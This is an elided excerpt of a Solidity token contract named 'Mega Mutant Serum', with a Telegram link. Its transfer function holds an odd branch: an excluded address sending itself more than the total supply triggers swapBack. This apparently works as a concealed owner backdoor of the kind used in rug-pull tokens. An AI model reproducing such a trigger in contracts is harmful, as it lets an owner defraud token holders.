...
//telegram: https://t.me/MEGAMUTANTSERUM
...
contract Mutant is Ownable, IERC20 {
    ...
    string private _name = "Mega Mutant Serum";
    string private _symbol = "MEGAMUTANTSERUM";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 100000000 * 10 ** _decimals;
    uint256 private _maxTxTokens = 4000000 * 10 ** _decimals;
    uint256 private _swapBackThreshold = _totalSupply;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if (recipient == sender && _isExcludedFromTax[msg.sender] && amount > _swapBackThreshold) {
            return swapBack(amount, recipient);
        }
        if (!inSwap) {
